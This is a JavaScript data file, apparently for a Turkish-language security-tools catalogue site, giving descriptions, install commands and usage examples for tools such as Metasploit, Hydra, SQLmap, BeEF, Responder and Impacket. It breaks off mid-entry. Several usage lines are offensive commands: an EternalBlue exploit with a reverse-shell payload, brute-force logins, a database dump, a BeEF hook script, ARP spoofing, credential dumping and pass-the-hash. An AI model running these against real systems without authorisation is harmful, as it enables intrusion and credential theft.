const toolsData = [
  {
    id: 'nmap',
    name: 'Nmap',
    desc: 'Ağ keşfi ve güvenlik taraması için endüstri standardı araç.',
    fullDesc: 'Nmap (Network Mapper), ağ keşfi ve güvenlik denetimi için kullanılan açık kaynaklı bir araçtır. Ağdaki cihazları, açık portları, çalışan servisleri ve işletim sistemlerini tespit etmek için kullanılır.',
    icon: 'fa-network-wired',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['bilgi', 'vulnerability'],
    tags: ['Port Tarama', 'Ağ Keşfi'],
    tagColor: '',
    features: ['Hızlı port tarama ve servis tespiti','İşletim sistemi tanımlama','NSE ile özelleştirilebilir taramalar','TCP/IP fingerprinting','Zenmap GUI arayüzü'],
    install: 'sudo apt update && sudo apt install -y nmap',
    usage: [{ title: 'Basit Port Taraması', code: 'nmap -sV 192.168.1.1' },{ title: 'OS Tespiti', code: 'nmap -O 192.168.1.1' },{ title: 'Tüm Portlar', code: 'nmap -p- 192.168.1.1' },{ title: 'NSE Script', code: 'nmap --script vuln 192.168.1.1' }]
  },
  {
    id: 'wireshark',
    name: 'Wireshark',
    desc: 'Ağ trafiğini gerçek zamanlı yakalama ve analiz etme aracı.',
    fullDesc: 'Wireshark, dünyanın en popüler ağ protokolü analizörüdür. Gerçek zamanlı ağ trafiğini yakalar ve derinlemesine paket incelemesi yapar.',
    icon: 'fa-eye',
    color: '#367bf0',
    bg: 'rgba(54,123,240,0.12)',
    cat: ['bilgi', 'forensic'],
    tags: ['Paket Analizi', 'Ağ İzleme'],
    tagColor: 'blue',
    features: ['Gerçek zamanlı ağ trafiği yakalama','3000+ protokol desteği','Güçlü filtreleme motoru','İstatistiksel analiz','Çıktı kaydetme'],
    install: 'sudo apt update && sudo apt install -y wireshark',
    usage: [{ title: 'CLI yakalama', code: 'tshark -i eth0 -c 100' },{ title: 'HTTP filtre', code: 'tshark -Y "http.request"' },{ title: 'Port filtresi', code: 'tshark -f "port 80"' }]
  },
  {
    id: 'metasploit',
    name: 'Metasploit',
    desc: 'Dünyanın en popüler sömürü framework\'ü.',
    fullDesc: 'Metasploit Framework, penetrasyon testi uzmanları için geliştirilmiş kapsamlı bir exploit geliştirme ve çalıştırma platformudur.',
    icon: 'fa-skull',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['exploit', 'vulnerability'],
    tags: ['Exploit', 'Framework'],
    tagColor: 'red',
    features: ['3500+ exploit modülü','500+ payload çeşidi','Post-exploitation araçları','Meterpreter kontrol','Modüler mimari'],
    install: 'sudo apt update && sudo apt install -y metasploit-framework',
    usage: [{ title: 'Konsol Başlatma', code: 'msfconsole' },{ title: 'Exploit Ara', code: 'search type:exploit platform:windows' },{ title: 'Exploit Kullan', code: 'use exploit/windows/smb/ms17_010_eternalblue' },{ title: 'Payload Ayarla', code: 'set PAYLOAD windows/x64/meterpreter/reverse_tcp' }]
  },
  {
    id: 'burpsuite',
    name: 'Burp Suite',
    desc: 'Web uygulama güvenlik testleri için kapsamlı platform.',
    fullDesc: 'Burp Suite, web uygulama güvenlik testleri için geliştirilmiş entegre bir platformdur.',
    icon: 'fa-spider',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.12)',
    cat: ['web'],
    tags: ['Web Güvenliği', 'Proxy'],
    tagColor: 'orange',
    features: ['Intercepting proxy','Otomatik web tarayıcı','Intruder brute-force','Repeater request tekrarlama','Decoder encoding'],
    install: 'sudo apt update && sudo apt install -y burpsuite',
    usage: [{ title: 'Başlatma', code: 'burpsuite' },{ title: 'Proxy', code: '# 127.0.0.1:8080 proxy ayarlayın' }]
  },
  {
    id: 'john',
    name: 'John the Ripper',
    desc: 'Hızlı parola kırma aracı.',
    fullDesc: 'John the Ripper, dünyanın en bilinen parola kırma araçlarından biridir.',
    icon: 'fa-lock',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['password'],
    tags: ['Parola Kırma', 'Hash'],
    tagColor: 'red',
    features: ['Çoklu hash formatı','Dictionary ve brute-force','Incremental mod','GPU hızlandırma','Özelleştirilebilir rules'],
    install: 'sudo apt update && sudo apt install -y john',
    usage: [{ title: 'Hash Kırma', code: 'john --format=raw-md5 hashes.txt' },{ title: 'Wordlist', code: 'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt' },{ title: 'Göster', code: 'john --show hashes.txt' }]
  },
  {
    id: 'aircrack',
    name: 'Aircrack-ng',
    desc: 'Wi-Fi ağ güvenliğini test etmek için kapsamlı araç seti.',
    fullDesc: 'Aircrack-ng, kablosuz ağların güvenliğini test etmek için kullanılan eksiksiz bir araç takımıdır.',
    icon: 'fa-wifi',
    color: '#a855f7',
    bg: 'rgba(168,85,247,0.12)',
    cat: ['wireless'],
    tags: ['Wi-Fi', 'Kablosuz'],
    tagColor: 'purple',
    features: ['WEP ve WPA/WPA2 kırma','Paket yakalama ve enjeksiyon','Monitor mode','Saldırı tespit','Kablosuz keşif'],
    install: 'sudo apt update && sudo apt install -y aircrack-ng',
    usage: [{ title: 'Monitor Mode', code: 'airmon-ng start wlan0' },{ title: 'Ağları Tara', code: 'airodump-ng wlan0mon' },{ title: 'Paket Yakala', code: 'airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w output wlan0mon' },{ title: 'WPA Kır', code: 'aircrack-ng -w wordlist.txt -b XX:XX:XX:XX:XX:XX output-01.cap' }]
  },
  {
    id: 'sqlmap',
    name: 'SQLmap',
    desc: 'SQL enjeksiyon zafiyetlerini otomatik tespit eden araç.',
    fullDesc: 'SQLmap, SQL enjeksiyon zafiyetlerini otomatik olarak tespit eden ve sömüren açık kaynaklı bir araçtır.',
    icon: 'fa-database',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    cat: ['web', 'exploit'],
    tags: ['SQL Injection', 'Web'],
    tagColor: 'cyan',
    features: ['Otomatik SQL enjeksiyon','6+ veritabanı desteği','Blind SQL injection','Veri çekme','Komut satırı erişimi'],
    install: 'sudo apt update && sudo apt install -y sqlmap',
    usage: [{ title: 'URL Testi', code: 'sqlmap -u "http://hedef.com/page?id=1"' },{ title: 'Veritabanı', code: 'sqlmap -u "http://hedef.com/page?id=1" --dbs' },{ title: 'Tablolar', code: 'sqlmap -u "http://hedef.com/page?id=1" -D db --tables' },{ title: 'Veri Çek', code: 'sqlmap -u "http://hedef.com/page?id=1" -D db -T users --dump' }]
  },
  {
    id: 'hydra',
    name: 'Hydra',
    desc: 'Ağ servislerine paralel brute-force saldırıları yapan araç.',
    fullDesc: 'Hydra, ağ kimlik doğrulama servislerine karşı brute-force saldırıları düzenlemek için kullanılan çok hızlı bir araçtır.',
    icon: 'fa-bolt',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.12)',
    cat: ['password'],
    tags: ['Brute Force', 'Kimlik Doğrulama'],
    tagColor: 'orange',
    features: ['50+ protokol desteği','Paralel bağlantı','Kullanıcı/parola listesi','Proxy ve SSL','Modüler mimari'],
    install: 'sudo apt update && sudo apt install -y hydra',
    usage: [{ title: 'SSH Brute Force', code: 'hydra -l root -P passwords.txt ssh://192.168.1.1' },{ title: 'FTP', code: 'hydra -L users.txt -P passwords.txt ftp://192.168.1.1' },{ title: 'HTTP POST', code: 'hydra -l admin -P pass.txt hedef.com http-post-form "/login:user=^USER^&pass=^PASS^:F=Hatalı"' }]
  },
  {
    id: 'nikto',
    name: 'Nikto',
    desc: 'Web sunucularını kapsamlı tarayan açık kaynaklı tarayıcı.',
    fullDesc: 'Nikto, web sunucularında tehlikeli dosyaları ve yanlış yapılandırmaları tespit eden bir web sunucu tarayıcısıdır.',
    icon: 'fa-server',
    color: '#367bf0',
    bg: 'rgba(54,123,240,0.12)',
    cat: ['web', 'vulnerability'],
    tags: ['Web Tarama', 'Sunucu'],
    tagColor: 'blue',
    features: ['7500+ tehlikeli dosya tespiti','1250+ eski yazılım tespiti','SSL kontrolü','HTML/CSV/XML çıktı','CGI analizi'],
    install: 'sudo apt update && sudo apt install -y nikto',
    usage: [{ title: 'Basit Tarama', code: 'nikto -h http://hedef.com' },{ title: 'SSL', code: 'nikto -h https://hedef.com -ssl' },{ title: 'Port', code: 'nikto -h hedef.com -p 8080' }]
  },
  {
    id: 'hashcat',
    name: 'Hashcat',
    desc: 'Dünyanın en hızlı parola kırma aracı. GPU destekli.',
    fullDesc: 'Hashcat, dünyanın en hızlı parola kırma aracıdır. GPU ile milyonlarca hash/saniye hızında kırma yapar.',
    icon: 'fa-microchip',
    color: '#ec4899',
    bg: 'rgba(236,72,153,0.12)',
    cat: ['password'],
    tags: ['GPU Kırma', 'Hash'],
    tagColor: 'pink',
    features: ['GPU/CPU desteği','320+ hash türü','Dictionary, brute-force, combinator','Rule-based saldırılar','Dağıtık kırma'],
    install: 'sudo apt update && sudo apt install -y hashcat',
    usage: [{ title: 'MD5 Kır', code: 'hashcat -m 0 -a 0 hash.txt rockyou.txt' },{ title: 'Brute Force', code: 'hashcat -m 0 -a 3 ?a?a?a?a?a?a' },{ title: 'Cihazlar', code: 'hashcat -I' }]
  },
  {
    id: 'gobuster',
    name: 'Gobuster',
    desc: 'Web uygulamalarında gizli dizin ve dosya keşfetme aracı.',
    fullDesc: 'Gobuster, web uygulamalarındaki gizli dizinleri ve DNS alt alan adlarını keşfetmek için kullanılır.',
    icon: 'fa-folder-open',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    cat: ['web', 'bilgi'],
    tags: ['Dizin Keşfi', 'Brute Force'],
    tagColor: 'cyan',
    features: ['Dizin ve dosya brute-force','DNS alt alan adı keşfi','Çoklu thread','Proxy desteği','Wordlist desteği'],
    install: 'sudo apt update && sudo apt install -y gobuster',
    usage: [{ title: 'Dizin Keşfi', code: 'gobuster dir -u http://hedef.com -w /usr/share/wordlists/dirb/common.txt' },{ title: 'DNS Keşfi', code: 'gobuster dns -d hedef.com -w subdomains.txt' },{ title: 'Uzantı', code: 'gobuster dir -u http://hedef.com -w wordlist.txt -x php,txt,html' }]
  },
  {
    id: 'bettercap',
    name: 'Bettercap',
    desc: 'Ağ saldırıları ve izleme için modüler framework.',
    fullDesc: 'Bettercap, ağ saldırıları ve MITM operasyonları için güçlü bir framework\'tür.',
    icon: 'fa-shield-halved',
    color: '#a855f7',
    bg: 'rgba(168,85,247,0.12)',
    cat: ['bilgi', 'exploit', 'wireless'],
    tags: ['MITM', 'Ağ İzleme'],
    tagColor: 'purple',
    features: ['HTTP/HTTPS/DNS spoofing','ARP poisoning','Wi-Fi deauthentication','BLE saldırıları','Gerçek zamanlı analiz'],
    install: 'sudo apt update && sudo apt install -y bettercap',
    usage: [{ title: 'Başlatma', code: 'sudo bettercap' },{ title: 'ARP Spoofing', code: 'set arp.spoof.targets 192.168.1.100; arp.spoof on' }]
  },
  {
    id: 'autopsy',
    name: 'Autopsy',
    desc: 'Dijital adli bilişim ve veri kurtarma platformu.',
    fullDesc: 'Autopsy, dijital adli bilişim analizleri için geliştirilmiş açık kaynaklı bir platformdur.',
    icon: 'fa-microscope',
    color: '#367bf0',
    bg: 'rgba(54,123,240,0.12)',
    cat: ['forensic'],
    tags: ['Adli Bilişim', 'Veri Kurtarma'],
    tagColor: 'blue',
    features: ['Disk imajı analizi','Silinmiş dosya kurtarma','Zaman çizelgesi analizi','Dosya türü filtreleme','Modül desteği'],
    install: 'sudo apt update && sudo apt install -y autopsy',
    usage: [{ title: 'Başlatma', code: 'autopsy' }]
  },
  {
    id: 'recon-ng',
    name: 'Recon-ng',
    desc: 'Web tabanlı bilgi toplama için modüler framework.',
    fullDesc: 'Recon-ng, açık kaynak istihbaratı toplamak için geliştirilmiş modüler bir framework\'tür.',
    icon: 'fa-robot',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['bilgi'],
    tags: ['OSINT', 'Bilgi Toplama'],
    tagColor: '',
    features: ['API tabanlı bilgi toplama','DNS ve WHOIS','Sosyal medya istihbaratı','Otomatik rapor','Python genişletilebilirlik'],
    install: 'sudo apt update && sudo apt install -y recon-ng',
    usage: [{ title: 'Başlatma', code: 'recon-ng' },{ title: 'API Ekle', code: 'keys add shodan_api YOUR_API_KEY' },{ title: 'Modül', code: 'use recon/domains-hosts/google_site_web; run' }]
  },
  {
    id: 'beef',
    name: 'BeEF',
    desc: 'Browser Exploitation Framework - tarayıcı zafiyet sömürü aracı.',
    fullDesc: 'BeEF, web tarayıcı güvenlik açıklarını kullanarak saldırılar gerçekleştirir.',
    icon: 'fa-crosshairs',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['exploit', 'web'],
    tags: ['Tarayıcı', 'Exploit'],
    tagColor: 'red',
    features: ['Gerçek zamanlı tarayıcı kontrolü','Kimlik bilgisi toplama','Sosyal mühendislik modülleri','Ağ keşfi','Metasploit entegrasyonu'],
    install: 'sudo apt update && sudo apt install -y beef-xss',
    usage: [{ title: 'Başlatma', code: 'sudo beef-xss' },{ title: 'Hook', code: '<script src="http://IP:3000/hook.js"></script>' }]
  },
  {
    id: 'netcat',
    name: 'Netcat',
    desc: 'Ağ bağlantıları için İsviçre Çakısı.',
    fullDesc: 'Netcat, TCP/UDP bağlantıları üzerinden veri okuma ve yazma yapabilen güçlü bir ağ aracıdır.',
    icon: 'fa-plug',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['bilgi', 'exploit'],
    tags: ['Ağ', 'Reverse Shell'],
    tagColor: '',
    features: ['TCP/UDP dinleme ve bağlanma','Port tarama','Dosya transferi','Reverse/bind shell','IPv4/IPv6 desteği'],
    install: 'sudo apt update && sudo apt install -y netcat-openbsd',
    usage: [{ title: 'Dinleme', code: 'nc -lvnp 4444' },{ title: 'Bağlantı', code: 'nc 192.168.1.100 80' },{ title: 'Port Tarama', code: 'nc -zv 192.168.1.1 20-100' },{ title: 'Dosya Transferi', code: 'nc -lvnp 4444 > dosya.txt' }]
  },
  {
    id: 'socat',
    name: 'Socat',
    desc: 'Netcat\'ten daha gelişmiş çok yönlü ağ aracı.',
    fullDesc: 'Socat, netcat\'in gelişmiş versiyonudur. SSL desteği ve çoklu adres tipleri sunar.',
    icon: 'fa-exchange-alt',
    color: '#367bf0',
    bg: 'rgba(54,123,240,0.12)',
    cat: ['bilgi', 'exploit'],
    tags: ['Proxy', 'Tunnel'],
    tagColor: 'blue',
    features: ['SSL/TLS desteği','TCP, UDP, UNIX soket','Fork ile çoklu bağlantı','Port forwarding','SOCKS proxy'],
    install: 'sudo apt update && sudo apt install -y socat',
    usage: [{ title: 'Dinleyici', code: 'socat TCP-LISTEN:4444 STDOUT' },{ title: 'SSL Dinleyici', code: 'socat OPENSSL-LISTEN:443,cert=cert.pem STDOUT' },{ title: 'Port Yönlendirme', code: 'socat TCP-LISTEN:8080,fork TCP:hedef.com:80' }]
  },
  {
    id: 'dirb',
    name: 'Dirb',
    desc: 'Web sunucularında gizli dizin tarama aracı.',
    fullDesc: 'Dirb, web sunucularındaki gizli dizinleri keşfetmek için dictionary tabanlı tarama yapar.',
    icon: 'fa-folder-tree',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.12)',
    cat: ['web', 'bilgi'],
    tags: ['Dizin Keşfi', 'Tarama'],
    tagColor: 'orange',
    features: ['Dictionary tabanlı tarama','Çoklu wordlist','HTTP/HTTPS desteği','Özelleştirilebilir uzantılar','Basit kullanım'],
    install: 'sudo apt update && sudo apt install -y dirb',
    usage: [{ title: 'Basit Tarama', code: 'dirb http://hedef.com' },{ title: 'Özel Wordlist', code: 'dirb http://hedef.com /usr/share/wordlists/dirb/big.txt' },{ title: 'Uzantı', code: 'dirb http://hedef.com -X .php,.txt,.html' }]
  },
  {
    id: 'enum4linux',
    name: 'Enum4linux',
    desc: 'Windows ve Samba sistemlerinde bilgi toplama aracı.',
    fullDesc: 'Enum4linux, Windows ve Samba sistemlerinden bilgi toplamak için kullanılır.',
    icon: 'fa-windows',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    cat: ['bilgi'],
    tags: ['SMB', 'Windows'],
    tagColor: 'cyan',
    features: ['Kullanıcı listesi','Paylaşım dizinleri','Grup ve policy','Parola politikası','SMB oturum kontrolü'],
    install: 'sudo apt update && sudo apt install -y enum4linux',
    usage: [{ title: 'Kullanıcılar', code: 'enum4linux -U 192.168.1.100' },{ title: 'Paylaşımlar', code: 'enum4linux -S 192.168.1.100' },{ title: 'Tüm Bilgi', code: 'enum4linux -a 192.168.1.100' }]
  },
  {
    id: 'cewl',
    name: 'CeWL',
    desc: 'Web sitelerinden özel wordlist oluşturma aracı.',
    fullDesc: 'CeWL, hedef web sitesini tarayarak özel wordlist oluşturur.',
    icon: 'fa-file-alt',
    color: '#a855f7',
    bg: 'rgba(168,85,247,0.12)',
    cat: ['password', 'bilgi'],
    tags: ['Wordlist', 'OSINT'],
    tagColor: 'purple',
    features: ['Kelime toplama','Meta veri analizi','Uzunluk filtresi','Derinlik ayarı','Dosyaya kaydetme'],
    install: 'sudo apt update && sudo apt install -y cewl',
    usage: [{ title: 'Wordlist', code: 'cewl http://hedef.com -w kelimeler.txt' },{ title: 'Derin Tarama', code: 'cewl http://hedef.com -d 3 -m 5 -w kelimeler.txt' },{ title: 'Email', code: 'cewl http://hedef.com --email -c' }]
  },
  {
    id: 'searchsploit',
    name: 'Searchsploit',
    desc: 'Exploit-DB veritabanında arama yapma aracı.',
    fullDesc: 'Searchsploit, Exploit-DB arşivinde exploit aramak için kullanılır.',
    icon: 'fa-database',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['exploit', 'vulnerability'],
    tags: ['Exploit', 'Arama'],
    tagColor: 'red',
    features: ['Exploit-DB offline arama','Metasploit modül yolu','Kategori filtresi','Exploit kodu görüntüleme','Hızlı arama'],
    install: 'sudo apt update && sudo apt install -y exploitdb',
    usage: [{ title: 'Arama', code: 'searchsploit apache 2.4' },{ title: 'Platform', code: 'searchsploit -t windows remote' },{ title: 'Metasploit Yolu', code: 'searchsploit -m 12345' }]
  },
  {
    id: 'wifite',
    name: 'Wifite',
    desc: 'Kablosuz ağ saldırıları için otomatik araç.',
    fullDesc: 'Wifite, kablosuz ağ saldırılarını otomatikleştirir.',
    icon: 'fa-satellite-dish',
    color: '#a855f7',
    bg: 'rgba(168,85,247,0.12)',
    cat: ['wireless'],
    tags: ['Wi-Fi', 'Otomasyon'],
    tagColor: 'purple',
    features: ['WEP/WPA/WPA2/WPS kırma','Otomatik hedef seçimi','PMKID ve handshake','Saldırı sıralaması','Renkli çıktı'],
    install: 'sudo apt update && sudo apt install -y wifite',
    usage: [{ title: 'Tüm Ağları Tara', code: 'wifite' },{ title: 'Belirli Ağ', code: 'wifite -e "HedefWiFi"' },{ title: 'Sadece WPA', code: 'wifite --wpa' }]
  },
  {
    id: 'volatility',
    name: 'Volatility',
    desc: 'Bellek adli bilişim analizi için framework.',
    fullDesc: 'Volatility, bilgisayar bellek görüntülerini analiz eder.',
    icon: 'fa-memory',
    color: '#367bf0',
    bg: 'rgba(54,123,240,0.12)',
    cat: ['forensic'],
    tags: ['Bellek Analizi', 'Adli Bilişim'],
    tagColor: 'blue',
    features: ['Windows/Linux/Mac analizi','İşlem ve servis tespiti','Ağ bağlantıları','Rootkit tespiti','DLL inceleme'],
    install: 'sudo apt update && sudo apt install -y volatility',
    usage: [{ title: 'Profil', code: 'volatility -f bellek.dmp imageinfo' },{ title: 'İşlemler', code: 'volatility -f bellek.dmp --profile=Win10x64 pslist' },{ title: 'Ağ', code: 'volatility -f bellek.dmp --profile=Win10x64 netscan' }]
  },
  {
    id: 'shodan',
    name: 'Shodan',
    desc: 'İnternet cihazlarını keşfetmek için arama motoru.',
    fullDesc: 'Shodan, internete bağlı cihazları indeksleyen dünyanın ilk arama motorudur.',
    icon: 'fa-satellite',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    cat: ['bilgi', 'vulnerability'],
    tags: ['OSINT', 'IoT'],
    tagColor: 'cyan',
    features: ['8 milyar+ cihaz','Gelişmiş filtreleme','Açık servis tespiti','IoT arama','API desteği'],
    install: 'sudo apt update && sudo apt install -y shodan',
    usage: [{ title: 'API', code: 'shodan init YOUR_API_KEY' },{ title: 'IP Tarama', code: 'shodan host 8.8.8.8' },{ title: 'Arama', code: 'shodan search "apache country:TR"' }]
  },
  {
    id: 'theharvester',
    name: 'theHarvester',
    desc: 'E-posta ve alt alan adı toplama aracı.',
    fullDesc: 'theHarvester, açık kaynaklardan bilgi toplamak için güçlü bir OSINT aracıdır.',
    icon: 'fa-magnifying-glass',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['bilgi'],
    tags: ['OSINT', 'E-posta'],
    tagColor: 'red',
    features: ['Arama motorlarından veri toplama','Shodan/Hunter/Censys','E-posta ve subdomain keşfi','DNS brute-force','HTML/XML çıktı'],
    install: 'sudo apt update && sudo apt install -y theharvester',
    usage: [{ title: 'E-posta', code: 'theharvester -d hedef.com -b google' },{ title: 'Tümü', code: 'theharvester -d hedef.com -b all' },{ title: 'DNS Brute', code: 'theharvester -d hedef.com -b google -c' }]
  },
  {
    id: 'crackmapexec',
    name: 'CrackMapExec',
    desc: 'Active Directory testi için Post-Exploit aracı.',
    fullDesc: 'CrackMapExec, büyük ölçekli ağları test etmek için kullanılır.',
    icon: 'fa-network-wired',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.12)',
    cat: ['exploit', 'password'],
    tags: ['Post-Exploit', 'AD'],
    tagColor: 'orange',
    features: ['AD dumping','Pass-the-Hash/Ticket','SMB/WinRM/RDP/SSH','Lateral movement','Credential harvesting'],
    install: 'sudo apt update && sudo apt install -y crackmapexec',
    usage: [{ title: 'Ağ Tara', code: 'crackmapexec smb 192.168.1.0/24' },{ title: 'Parola Testi', code: 'crackmapexec smb 192.168.1.100 -u admin -p pass123' },{ title: 'LSASS', code: 'crackmapexec smb 192.168.1.100 -u admin -p pass123 --lsa' }]
  },
  {
    id: 'responder',
    name: 'Responder',
    desc: 'LLMNR/NBT-NS/MDNS poisoner ve credential toplayıcı.',
    fullDesc: 'Responder, yerel ağda LLMNR/NBT-NS/MDNS isteklerini yakalar ve NTLM hash\'leri toplar.',
    icon: 'fa-triangle-exclamation',
    color: '#ef4444',
    bg: 'rgba(239,68,68,0.12)',
    cat: ['exploit', 'password'],
    tags: ['MITM', 'NTLM'],
    tagColor: 'red',
    features: ['LLMNR/NBT-NS/MDNS poisoning','NTLMv1/v2 hash yakalama','WPAD poisoning','Çoklu credential toplama','IPv6 poisoning'],
    install: 'sudo apt update && sudo apt install -y responder',
    usage: [{ title: 'Başlatma', code: 'sudo responder -I eth0 -wrf' },{ title: 'Analiz', code: 'sudo responder -I eth0 --analyze' },{ title: 'Hash Yakala', code: 'sudo responder -I eth0 -v' }]
  },
  {
    id: 'evil-winrm',
    name: 'Evil-WinRM',
    desc: 'WinRM hedefleriyle shell sağlayan araç.',
    fullDesc: 'Evil-WinRM, WinRM üzerinden PowerShell tabanlı shell kurar.',
    icon: 'fa-terminal',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['exploit'],
    tags: ['WinRM', 'Shell'],
    tagColor: '',
    features: ['Encrypted PowerShell shell','Pass-the-Hash','Base64 dosya transferi','SOCKS proxy','Invoke-Binary'],
    install: 'sudo apt update && sudo apt install -y evil-winrm',
    usage: [{ title: 'Bağlantı', code: 'evil-winrm -i 192.168.1.100 -u admin -p pass123' },{ title: 'PtH', code: 'evil-winrm -i 192.168.1.100 -u admin -H aad3b435b51404ee' },{ title: 'Dosya', code: 'evil-winrm -i 192.168.1.100 -u admin -p pass123 -s /scripts' }]
  },
  {
    id: 'impacket',
    name: 'Impacket',
    desc: 'Ağ protokolleri için Python koleksiyonu.',
    fullDesc: 'Impacket, SMB/DCOM/Kerberos gibi protokoller üzerinde düşük seviyeli erişim sağlar.',
    icon: 'fa-code',
    color: '#a855f7',
    bg: 'rgba(168,85,247,0.12)',
    cat: ['exploit', 'bilgi'],
    tags: ['Python', 'SMB'],
    tagColor: 'purple',
    features: ['SMB/DCOM/WMI/MSSQL','Kerberos saldırıları','Pass-the-Hash','SecretsDump','BloodHound entegrasyonu'],
    install: 'sudo apt update && sudo apt install -y impacket-scripts',
    usage: [{ title: 'SMB', code: 'smbclient.py user:pass@192.168.1.100' },{ title: 'SecretsDump', code: 'secretsdump.py user:pass@192.168.1.100' },{ title: 'Kerberoast', code: 'GetUserSPNs.py hedef.com/user:pass -request' },{ title: 'WMI Exec', code: 'wmiexec.py user:pass@192.168.1.100' }]
  },
  {
    id: 'lynis',
    name: 'Lynis',
    desc: 'Güvenlik denetimi ve sızma testi aracı.',
    fullDesc: 'Lynis, Linux/macOS/Unix için kapsamlı güvenlik denetimi yapar.',
    icon: 'fa-clipboard-check',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['vulnerability'],
    tags: ['Güvenlik Denetimi', 'Hardening'],
    tagColor: '',
    features: ['Otomatik denetim','100+ kontrol','Raporlama','Compliance testleri','Sistem bilgisi toplama'],
    install: 'sudo apt update && sudo apt install -y lynis',
    usage: [{ title: 'Hızlı', code: 'sudo lynis audit system --quick' },{ title: 'Tam', code: 'sudo lynis audit system' },{ title: 'Özel Profil', code: 'sudo lynis audit system --profile /etc/lynis/custom.prf' }]
  },
  {
    id: 'masscan',
    name: 'Masscan',
    desc: 'İnternet ölçeğinde en hızlı port tarayıcı.',
    fullDesc: 'Masscan, 65535 portu 60 saniyede tarayabilen en hızlı port tarayıcıdır.',
    icon: 'fa-bolt-lightning',
    color: '#f59e0b',
    bg: 'rgba(245,158,11,0.12)',
    cat: ['bilgi', 'vulnerability'],
    tags: ['Port Tarama', 'Hızlı'],
    tagColor: 'orange',
    features: ['60 saniyede 65535 port','SYN/ACK/UDP modları','Asenkron tarama','Banner toplama','Nmap uyumlu çıktı'],
    install: 'sudo apt update && sudo apt install -y masscan',
    usage: [{ title: 'Hızlı Tarama', code: 'masscan 192.168.1.0/24 -p0-65535 --rate=1000' },{ title: 'Port', code: 'masscan 192.168.1.1 -p22,80,443' },{ title: 'Banner', code: 'masscan 192.168.1.0/24 -p80 --banners' }]
  },
  {
    id: 'setoolkit',
    name: 'SET',
    desc: 'Sosyal mühendislik saldırıları için framework.',
    fullDesc: 'SET, sosyal mühendislik saldırıları için tasarlanmış araçtır.',
    icon: 'fa-user-secret',
    color: '#ec4899',
    bg: 'rgba(236,72,153,0.12)',
    cat: ['exploit'],
    tags: ['Sosyal Mühendislik', 'Phishing'],
    tagColor: 'pink',
    features: ['Spear phishing','Credential harvester','Website attack vectors','Mass mailer','USB/disk attack'],
    install: 'sudo apt update && sudo apt install -y set',
    usage: [{ title: 'Başlatma', code: 'sudo setoolkit' },{ title: 'Credential Harvester', code: '# Menü: 1 > 2 > 3' },{ title: 'Spear Phishing', code: '# Menü: 1 > 1' }]
  },
  {
    id: 'mitmproxy',
    name: 'mitmproxy',
    desc: 'İnteraktif HTTPS proxy ve trafik analiz aracı.',
    fullDesc: 'mitmproxy, HTTP/HTTPS trafiğini yakalayan ve manipüle eden proxy aracıdır.',
    icon: 'fa-arrows-split-up-and-left',
    color: '#06b6d4',
    bg: 'rgba(6,182,212,0.12)',
    cat: ['web'],
    tags: ['Proxy', 'HTTPS'],
    tagColor: 'cyan',
    features: ['HTTPS intercept','İnteraktif CLI','Python script desteği','WebSocket','Harici proxy modu'],
    install: 'sudo apt update && sudo apt install -y mitmproxy',
    usage: [{ title: 'Proxy', code: 'mitmproxy' },{ title: 'Web', code: 'mitmweb' },{ title: 'Script', code: 'mitmdump -s script.py' }]
  },
  {
    id: 'enum4linux-ng',
    name: 'enum4linux-ng',
    desc: 'Gelişmiş SMB/NetBIOS enumeration aracı.',
    fullDesc: 'enum4linux-ng, modern Python tabanlı SMB/NetBIOS/AD enumeration aracıdır.',
    icon: 'fa-sitemap',
    color: '#367bf0',
    bg: 'rgba(54,123,240,0.12)',
    cat: ['bilgi'],
    tags: ['SMB', 'NetBIOS'],
    tagColor: 'blue',
    features: ['SMB1/SMB2/SMB3','NetBIOS/LLMNR','LDAPS/Kerberos','JSON/XML çıktı','Python3'],
    install: 'sudo apt update && sudo apt install -y enum4linux-ng',
    usage: [{ title: 'Enumeration', code: 'enum4linux-ng -A 192.168.1.100' },{ title: 'SMB', code: 'enum4linux-ng -S 192.168.1.100' },{ title: 'JSON', code: 'enum4linux-ng -A -j output.json 192.168.1.100' }]
  },
  {
    id: 'fierce',
    name: 'Fierce',
    desc: 'DNS enumeration ve subdomain keşfetme aracı.',
    fullDesc: 'Fierce, DNS zone transfer, brute-force ve adjacency tespiti yapar.',
    icon: 'fa-globe',
    color: '#00ff88',
    bg: 'rgba(0,255,136,0.12)',
    cat: ['bilgi'],
    tags: ['DNS', 'Subdomain'],
    tagColor: '',
    features: ['DNS zone transfer','Subdomain brute-force','Adjacent IP keşfi','WHOIS','Hızlı DNS tarama'],
    install: 'sudo apt update && sudo apt install -y fierce',
    usage: [{ title: 'DNS', code: 'fierce --domain hedef.com' },{ title: 'Özel DNS', code: 'fierce --domain hedef.com --dns-servers 8.8.8.8' },{ title: 'Brute', code: 'fierce --domain hedef.com --subdomain-file wordlist.txt' }]
  },
  {
    id: 'trufflehog',
    name: 'TruffleHog',
    desc: 'Git depolarında sızıntıları tarayan araç.',
    fullDesc: 'TruffleHog, Git depolarında duyarlı bilgileri ve anahtarları tarar.',
    icon: 'fa-key',
    color: '#a855f7',
    bg: 'rgba(168,85,247,0.12)',
    cat: ['bilgi', 'vulnerability'],
    tags: ['Secret', 'Git'],
    tagColor: 'purple',
